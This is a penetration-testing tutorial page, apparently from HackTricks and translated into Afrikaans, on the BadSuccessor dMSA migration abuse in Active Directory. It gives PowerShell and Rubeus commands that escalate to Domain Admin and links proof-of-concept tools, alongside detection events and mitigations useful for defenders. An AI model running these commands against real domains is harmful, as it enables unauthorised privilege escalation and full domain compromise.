# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Delegated Managed Service Accounts (**dMSA**) is die volgende generasie opvolger van **gMSA** wat in Windows Server 2025 verskaf word. 'n Legitieme migrasieworkflow laat administrateurs toe om 'n *ou* rekening (gebruikers-, rekenaar- of diensrekening) met 'n dMSA te vervang terwyl toestemming deursigtig behou word. Die workflow word blootgestel deur PowerShell cmdlets soos `Start-ADServiceAccountMigration` en `Complete-ADServiceAccountMigration` en is afhanklik van twee LDAP-attribuut van die **dMSA objek**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN skakel* na die vervangde (ou) rekening.
* **`msDS-DelegatedMSAState`**       – migrasiestaat (`0` = geen, `1` = in-proses, `2` = *voltooid*).

As 'n aanvaller **enige** dMSA binne 'n OU kan skep en daardie 2 attribuut direk kan manipuleer, sal LSASS & die KDC die dMSA as 'n *opvolger* van die gekoppelde rekening behandel. Wanneer die aanvaller vervolgens as die dMSA autentiseer, **erf hulle al die voorregte van die gekoppelde rekening** – tot **Domain Admin** as die Administrateurrekening gekoppel is.

Hierdie tegniek is **BadSuccessor** genoem deur Unit 42 in 2025. Ten tyde van skryf is daar **geen sekuriteitsopdatering** beskikbaar nie; slegs die verharding van OU-toestemmings verminder die probleem.

### Aanval vereistes

1. 'n Rekening wat *toegelaat* word om voorwerpe binne **'n Organisatoriese Eenheid (OU)** te skep *en* ten minste een van die volgende het:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** objek klas
* `Create Child` → **`All Objects`** (generiese skep)
2. Netwerkverbinding na LDAP & Kerberos (standaard domein-verbonden scenario / afstandaanval).

## Opname van Kwetsbare OUs

Unit 42 het 'n PowerShell-helper script vrygestel wat sekuriteitsbeskrywings van elke OU ontleed en die vereiste ACE's uitlig:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Onder die oppervlak voer die skrip 'n gepagte LDAP-soektog uit vir `(objectClass=organizationalUnit)` en kontroleer elke `nTSecurityDescriptor` vir

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (objek klas *msDS-DelegatedManagedServiceAccount*)

## Exploitasiestappe

Sodra 'n skryfbare OU geïdentifiseer is, is die aanval net 3 LDAP-skrywe weg:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Na replika kan die aanvaller eenvoudig **logon** as `attacker_dMSA$` of 'n Kerberos TGT aan vra – Windows sal die token van die *vervanger* rekening bou.

### Outomatisering

Verskeie openbare PoCs omhul die hele werksvloei, insluitend wagwoordherwinning en kaartbestuur:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Exploitasie
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detectie & Jag

Enable **Object Auditing** op OUs en monitor vir die volgende Windows Veiligheid Gebeure:

* **5137** – Skepping van die **dMSA** objek
* **5136** – Wysiging van **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Spesifieke attribuut veranderinge
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – TGT uitreiking vir die dMSA

Die korrelasie van `4662` (attribuut wysiging), `4741` (skepping van 'n rekenaar/dienste rekening) en `4624` (volgende aanmelding) beklemtoon vinnig BadSuccessor aktiwiteit. XDR oplossings soos **XSIAM** kom met gereed-om-te-gebruik navrae (sien verwysings).

## Versagting

* Pas die beginsel van **minimale bevoegdheid** toe – delegeer slegs *Dienste Rekening* bestuur aan vertroude rolle.
* Verwyder `Create Child` / `msDS-DelegatedManagedServiceAccount` van OUs wat dit nie eksplisiet vereis nie.
* Monitor vir die gebeurtenis ID's hierbo gelys en waarsku oor *nie-Tier-0* identiteite wat dMSAs skep of redigeer.

## Sien ook

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Verwysings

- [Unit42 – Wanneer Goeie Rekeninge Sleg Gaan: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
